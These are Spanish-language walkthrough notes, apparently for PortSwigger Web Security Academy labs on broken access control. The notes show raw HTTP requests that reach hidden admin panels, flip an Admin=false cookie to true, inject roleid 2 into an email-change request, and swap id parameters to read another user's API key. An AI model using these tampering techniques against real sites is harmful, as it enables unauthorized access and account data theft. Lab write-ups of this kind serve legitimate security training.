# Unprotected admin functionality

Para este laboratorio revisamos el archivo /robots.txt nos damos cuenta que tiene una entrada disallow para
que no indexar las rutas del panel de administracion pero esta no esta protegida contra otras cosas esta
sin proteccion.

```
/robots.txt
https://0a1b0020048158d2c00f577b00ea00e8.web-security-academy.net/administrator-panel

```

# Unprotected admin functionality with unpredictable URL

Para este laboratorio se tiene que encontrar un script que si esta en true genera una ancla y pone ahi el link y no esta protegido
pero lo puedes intuir sin modificar el script entrar y borras el usuario de carlos y resuleves el lab


```
https://0a01008a0387d145c0fc097500f2008b.web-security-academy.net/admin-6eu67g

```

# User role controlled by request parameter

## How To Write Burp Suite Match and Replace Rules

> https://matthewsetter.com/write-burp-suite-match-and-replace-rules/


Para este laboratorio se usa esto de remplazar la cookie por Admin=true; para no estar modfiicando manuealmente
nos vamos a ***Pestala intercept -> Options -> Match and Remplace -> add -> Admin=false por Admin=true;***
y todas la peticiones donde encuentre eso va aponer true lo que nos hace automaticamente 
administradores y se resuleve el lab.

```
GET /my-account?id=wiener HTTP/1.1
Host: 0a8700bf033e511cc0440b7100e9000e.web-security-academy.net
Cookie: Admin=false; session=v9olK9hh4BJfTzIJbp7xmKOkKWDLT2fB
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8700bf033e511cc0440b7100e9000e.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close



```

# User role can be modified in user profile

Para este laboratorio tienes que checar que en cambiar email pero en la ***respuesta*** viene un roleid de 1 si lo cambias 
a 2 se activa el accso al panel de adminsitrador.

```
HTTP/1.1 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 125

{
  "username": "wiener",
  "email": "asdfahskldf@gmail.com",
  "apikey": "voVlkpFjjPYwDjt3rh4jZ6VGhuDrS7Pf",
  "roleid": 2
}

```

Y lo que mandas es esto

```
POST /my-account/change-email HTTP/1.1
Host: 0a2a005f03a21519c06c546f000e003b.web-security-academy.net
Cookie: session=OyyXUyKR5MXT6dLK4e7H6Q2ZLUMLnHeu
Content-Length: 47
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a2a005f03a21519c06c546f000e003b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2a005f03a21519c06c546f000e003b.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close

{"email":"asdfahskldf@gmail.com","roleid": 2
}

```

# User ID controlled by request parameter

En este caso inicias sesion con el usario de winer y al ir a la pagina de inicio y regresar a "My account" 
pues la petcion se hace por medio de get cambiamos al usuario carlos y nos da el API key


```
GET /my-account?id=carlos HTTP/1.1
Host: 0a3e001c0471e8d7c15dd5610070008b.web-security-academy.net
Cookie: session=v8lHYb41ErTLQlH0fy0hBWOwLajvQEdu
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e001c0471e8d7c15dd5610070008b.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close



```

# User ID controlled by request parameter, with unpredictable user IDs

Para este laboratorio nos damos cuenta que ahora la peticion get esta hecha en base a un id tipo random o presumiblemente
GUID como no podemos saber como generar esa para el usuario carlos navegamos un poco dentro de la pagina 
y nos damos cuenta que en un post que hizo carlos y ahi se encentra su user id  y con ese hacemos la peticion get y nos
deja ver su api KEY.

```
GET /my-account?id=82a032e7-c10b-457b-96fd-bdbcf02faa99 HTTP/1.1
Host: 0a07000f04c824bcc0afcb9400c700cd.web-security-academy.net
Cookie: session=87MYGsqfcMQKo9t9Urban5frASCe5IWL
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a07000f04c824bcc0afcb9400c700cd.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close


```

# User ID controlled by request parameter with data leakage in redirect

Para este lab se cambia en la peticion get de usuario al usuario carlos y antes de redireccionar la pagina muestra el API key de este usuario
siempre fijase que en las redirecciones no exista informacion valiosa asi como intentar renderizar la paginas para ver que es lo que se
anda enviando.


```
GET /my-account?id=carlos HTTP/1.1
Host: 0a900053030290c0c0636add0051009a.web-security-academy.net
Cookie: session=XsJHeU3AAqiASZSXkY1qcyiieCOpCI3T
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a900053030290c0c0636add0051009a.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close



```
















